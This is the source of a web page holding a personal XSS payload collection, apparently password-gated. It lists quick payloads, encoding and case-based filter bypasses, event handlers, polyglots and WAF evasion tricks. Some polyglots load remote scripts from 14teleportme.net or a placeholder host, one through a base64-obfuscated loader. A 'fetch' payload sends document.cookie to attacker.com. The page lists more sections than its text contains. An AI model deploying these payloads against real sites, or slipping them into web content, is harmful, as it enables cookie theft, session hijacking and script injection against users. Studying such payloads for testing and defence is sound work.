---
import MainGridLayout from "../layouts/MainGridLayout.astro";
---

<MainGridLayout title="R3XSS" description="Private XSS Research Notes & Resources">
    <div class="flex w-full rounded-[var(--radius-large)] overflow-hidden relative min-h-32">
        <div class="card-base z-10 px-9 py-6 relative w-full">

            <!-- Password Gate -->
            <div id="password-gate" class="text-center py-12">
                <div class="text-6xl mb-4">🔒</div>
                <h1 class="text-2xl font-bold mb-4 text-[var(--primary)]">R3XSS - Private Section</h1>
                <p class="text-gray-400 mb-6">This section contains private XSS research notes.<br/>Enter the password to access.</p>

                <div class="max-w-sm mx-auto">
                    <input
                        type="password"
                        id="password-input"
                        placeholder="Enter password..."
                        class="w-full px-4 py-3 rounded-lg bg-[var(--card-bg)] border border-[var(--primary)] text-white text-center focus:outline-none focus:ring-2 focus:ring-[var(--primary)] mb-4"
                    />
                    <button
                        id="unlock-btn"
                        class="w-full px-6 py-3 bg-[var(--primary)] hover:opacity-80 text-white font-bold rounded-lg transition-all"
                    >
                        Unlock Content
                    </button>
                    <p id="error-msg" class="text-red-500 mt-3 hidden">Incorrect password. Try again.</p>
                </div>
            </div>

            <!-- Protected Content (hidden by default) -->
            <div id="protected-content" class="hidden">
                <div class="flex justify-between items-center mb-6">
                    <h1 class="text-3xl font-bold text-[var(--primary)]">🎯 R3XSS Research Notes</h1>
                    <button id="lock-btn" class="px-4 py-2 bg-red-600 hover:bg-red-700 text-white text-sm rounded-lg transition-all">
                        🔒 Lock
                    </button>
                </div>

                <p class="text-gray-400 mb-8">Personal collection of XSS payloads, bypasses, techniques, CTF writeups, and resources.</p>

                <!-- Table of Contents -->
                <div class="mb-8 bg-black/30 rounded-lg p-4">
                    <h3 class="font-bold text-yellow-400 mb-3">📑 Table of Contents</h3>
                    <ul class="space-y-1 text-blue-400">
                        <li><a href="#quick-payloads" class="hover:underline">⚡ Quick Payloads</a></li>
                        <li><a href="#filter-bypasses" class="hover:underline">🛡️ Filter Bypasses</a></li>
                        <li><a href="#event-handlers" class="hover:underline">🎯 Event Handlers</a></li>
                        <li><a href="#polyglots" class="hover:underline">🔥 Polyglot Payloads</a></li>
                        <li><a href="#waf-bypasses" class="hover:underline">🚧 WAF Bypass Techniques</a></li>
                        <li><a href="#dom-xss" class="hover:underline">🌐 DOM XSS Sources & Sinks</a></li>
                        <li><a href="#ctf-platforms" class="hover:underline">🏆 CTF Platforms & Challenges</a></li>
                        <li><a href="#ctf-writeups" class="hover:underline">📝 Individual CTF Writeups</a></li>
                        <li><a href="#advanced-techniques" class="hover:underline">🧪 Advanced Techniques & Research</a></li>
                        <li><a href="#tools" class="hover:underline">🛠️ Tools</a></li>
                    </ul>
                </div>

                <!-- Quick Reference -->
                <div id="quick-payloads" class="mb-8">
                    <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">⚡ Quick Payloads</h2>
                    <div class="bg-black/30 rounded-lg p-4 overflow-x-auto">
                        <pre class="text-green-400 text-sm"><code>&lt;script&gt;alert(1)&lt;/script&gt;
&lt;img src=x onerror=alert(1)&gt;
&lt;svg onload=alert(1)&gt;
&lt;body onload=alert(1)&gt;
&lt;iframe src="javascript:alert(1)"&gt;
&lt;input onfocus=alert(1) autofocus&gt;
&lt;marquee onstart=alert(1)&gt;
&lt;details open ontoggle=alert(1)&gt;
&lt;audio src=x onerror=alert(1)&gt;
&lt;video src=x onerror=alert(1)&gt;
&lt;math&gt;&lt;mtext&gt;&lt;/mtext&gt;&lt;mglyph&gt;&lt;svg&gt;&lt;mtext&gt;&lt;style&gt;&lt;path id="--&gt;&lt;img onerror=alert(1) src&gt;"&gt;</code></pre>
                    </div>
                </div>

                <!-- Filter Bypass Section -->
                <div id="filter-bypasses" class="mb-8">
                    <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🛡️ Filter Bypasses</h2>

                    <h3 class="text-xl font-semibold mb-2 text-white">Case Manipulation</h3>
                    <div class="bg-black/30 rounded-lg p-4 mb-4 overflow-x-auto">
                        <pre class="text-green-400 text-sm"><code>&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
&lt;IMG SRC=x OnErRoR=alert(1)&gt;
&lt;SVG ONLOAD=alert(1)&gt;</code></pre>
                    </div>

                    <h3 class="text-xl font-semibold mb-2 text-white">Encoding Bypasses</h3>
                    <div class="bg-black/30 rounded-lg p-4 mb-4 overflow-x-auto">
                        <pre class="text-green-400 text-sm"><code>// URL Encoding
%3Cscript%3Ealert(1)%3C/script%3E

// Double URL Encoding
%253Cscript%253Ealert(1)%253C/script%253E

// HTML Entity Encoding
&lt;img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)&gt;

// Unicode Encoding
&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(1)&lt;/script&gt;

// Hex Encoding
&lt;script&gt;eval('\x61\x6c\x65\x72\x74\x28\x31\x29')&lt;/script&gt;

// Octal Encoding
&lt;script&gt;eval('\141\154\145\162\164\50\61\51')&lt;/script&gt;

// Base64
&lt;script&gt;eval(atob('YWxlcnQoMSk='))&lt;/script&gt;</code></pre>
                    </div>

                    <h3 class="text-xl font-semibold mb-2 text-white">Tag & Attribute Bypasses</h3>
                    <div class="bg-black/30 rounded-lg p-4 mb-4 overflow-x-auto">
                        <pre class="text-green-400 text-sm"><code>// Null bytes
&lt;scr%00ipt&gt;alert(1)&lt;/script&gt;

// New lines / tabs
&lt;script&#10;&gt;alert(1)&lt;/script&gt;
&lt;script&#9;&gt;alert(1)&lt;/script&gt;

// Without closing tag
&lt;script&gt;alert(1)//
&lt;script&gt;alert(1)&lt;/script

// Without spaces
&lt;svg/onload=alert(1)&gt;
&lt;img/src=x/onerror=alert(1)&gt;

// Using backticks
&lt;img src=x onerror=`alert(1)`&gt;

// Breaking with comments
&lt;script&gt;/**/alert(1)/**/&lt;/script&gt;</code></pre>
                    </div>
                </div>

                <!-- Event Handlers -->
                <div id="event-handlers" class="mb-8">
                    <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🎯 Event Handlers</h2>
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div class="bg-black/30 rounded-lg p-4">
                            <h4 class="font-bold text-yellow-400 mb-2">Mouse Events</h4>
                            <code class="text-green-400 text-sm">onclick, ondblclick, onmousedown, onmouseup, onmouseover, onmouseout, onmousemove, onmouseenter, onmouseleave, oncontextmenu</code>
                        </div>
                        <div class="bg-black/30 rounded-lg p-4">
                            <h4 class="font-bold text-yellow-400 mb-2">Keyboard Events</h4>
                            <code class="text-green-400 text-sm">onkeydown, onkeyup, onkeypress</code>
                        </div>
                        <div class="bg-black/30 rounded-lg p-4">
                            <h4 class="font-bold text-yellow-400 mb-2">Form Events</h4>
                            <code class="text-green-400 text-sm">onfocus, onblur, onchange, onsubmit, onreset, oninput, oninvalid, onselect</code>
                        </div>
                        <div class="bg-black/30 rounded-lg p-4">
                            <h4 class="font-bold text-yellow-400 mb-2">Media/Load Events</h4>
                            <code class="text-green-400 text-sm">onload, onerror, onabort, oncanplay, onended, onpause, onplay, onloadstart, onprogress</code>
                        </div>
                        <div class="bg-black/30 rounded-lg p-4">
                            <h4 class="font-bold text-yellow-400 mb-2">Animation/Transition</h4>
                            <code class="text-green-400 text-sm">onanimationend, onanimationstart, ontransitionend, ontransitionstart</code>
                        </div>
                        <div class="bg-black/30 rounded-lg p-4">
                            <h4 class="font-bold text-yellow-400 mb-2">Special Events</h4>
                            <code class="text-green-400 text-sm">ontoggle, onwheel, oncopy, oncut, onpaste, ondrag, ondrop, onscroll, onresize</code>
                        </div>
                    </div>
                </div>

                <!-- Polyglots -->
                <div id="polyglots" class="mb-8">
                    <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🔥 Polyglot Payloads</h2>
                    <div class="bg-black/30 rounded-lg p-4 overflow-x-auto">
                        <pre class="text-green-400 text-sm"><code>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e

'&gt;--&gt;"&gt;&lt;/Script&gt;&lt;Script/Src=//14teleportme.net&gt;

"&gt;'&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vMTR0ZWxlcG9ydG1lLm5ldCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))&gt;

javascript:"/*'/*`/*--&gt;&lt;/noscript&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/template&gt;&lt;/noembed&gt;&lt;/script&gt;&lt;html \" onmouseover=/*&amp;lt;svg/*/onload=alert()//&gt;

"'--&gt;&lt;/style&gt;&lt;/script&gt;&lt;svg/onload='+/"/+/onmouseover=1/+(s=document.createElement('script'),s.src='//HOST',document.body.appendChild(s))//&gt;

&lt;!--`&lt;img/src=` onerror=alert(1)//--&gt;&lt;img src=x onerror=`alert(2)`//*&gt;&lt;img src onerror=alert(3)&gt;*/"'&gt;&lt;img src=x onerror=alert(4)&gt;//&lt;/script&gt;</code></pre>
                    </div>
                </div>

                <!-- WAF Bypasses -->
                <div id="waf-bypasses" class="mb-8">
                    <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🚧 WAF Bypass Techniques</h2>
                    <div class="bg-black/30 rounded-lg p-4 overflow-x-auto">
                        <pre class="text-green-400 text-sm"><code>// Using SVG
&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;&lt;/svg&gt;

// Using constructor
&lt;img src=x onerror="window['alert'](1)"&gt;
&lt;img src=x onerror="this['ale'+'rt'](1)"&gt;
&lt;img src=x onerror="[].constructor.constructor('alert(1)')()"&gt;

// Top/self/parent/frames
&lt;img src=x onerror=top.alert(1)&gt;
&lt;img src=x onerror=self.alert(1)&gt;
&lt;img src=x onerror=parent.alert(1)&gt;
&lt;img src=x onerror=frames.alert(1)&gt;

// setTimeout/setInterval
&lt;img src=x onerror=setTimeout('alert(1)')&gt;
&lt;img src=x onerror=setInterval('alert(1)')&gt;

// Function constructor
&lt;img src=x onerror="Function('alert(1)')()"&gt;
&lt;img src=x onerror="new Function`alert\`1\``"&gt;

// Using eval with encoding
&lt;img src=x onerror=eval(atob('YWxlcnQoMSk='))&gt;
&lt;img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&gt;

// Fetch-based (for data exfiltration)
&lt;img src=x onerror="fetch('https://attacker.com?c='+document.cookie)"&gt;

// Using location
&lt;img src=x onerror=location='javascript:alert(1)'&gt;

// Template literals
&lt;img src=x onerror=alert`1`&gt;

// Object methods
&lt;img src=x onerror="Reflect.apply(alert,null,[1])"&gt;</code></pre>
                    </div>
                </div>

